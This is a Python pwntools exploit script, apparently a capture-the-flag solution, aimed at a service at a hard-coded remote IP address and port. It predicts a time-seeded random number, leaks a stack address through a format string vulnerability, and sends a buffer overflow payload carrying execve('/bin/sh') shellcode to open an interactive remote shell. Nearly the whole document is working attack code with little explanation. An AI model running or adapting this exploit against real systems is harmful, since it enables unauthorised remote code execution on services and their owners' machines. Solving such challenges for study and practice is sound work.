from pwn import *
import ctypes
import time
import re

# Load the C standard library
libc = ctypes.CDLL("libc.so.6")

current_seed = int(time.time())
success = False

# Try a window of seeds around the current time to account for time sync issues
for offset in range(-2, 3):
    try:
        seed = current_seed + offset
        libc.srand(seed)
        number = libc.rand() % 0x5b + 10

        p = remote('34.45.81.67', 16004, level='error')

        # Handle initial prompt
        try:
            p.recv(timeout=1)
        except:
            pass

        # Send name
        p.sendline(b'bunda')

        # Send predicted random number
        p.recvuntil(b'honks?')
        p.sendline(str(number).encode())

        # Leak stack address using format string vulnerability
        p.recvuntil(b'again?')
        p.sendline(b'%p')

        # Receive and parse leaked address
        try:
            data = p.recvuntil(b'\n', timeout=1)
        except:
            data = p.recv(timeout=1)
        
        match = re.search(b'0x[0-9a-f]+', data)
        if not match:
            p.close()
            continue
            
        leak_str = match.group()
        try:
            addr = int(leak_str, 16)
        except:
            p.close()
            continue

        # Shellcode for execve("/bin/sh", 0, 0)
        shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
        
        # Calculate shellcode address (buffer start + offset)
        shellcode_addr = addr + 0x126
        
        # Construct payload: padding + shellcode + more padding + return address
        payload = b"a" * 0x126
        payload += shellcode
        payload += b"z" * (0x3b - (len(payload) % 8))  # Align to 8 bytes
        payload += p64(shellcode_addr)

        # Send final payload
        p.recvuntil(b'world?')
        p.sendline(payload)

        # Verify shell
        p.sendline(b'echo hello')
        try:
            if b'hello' in p.recv(timeout=1):
                success = True
                print(f"Success! Seed offset: {offset}")
                p.interactive()
                break
        except:
            p.close()
    except:
        try:
            p.close()
        except:
            pass

if not success:
    print("Exploit failed. Try adjusting the seed window.")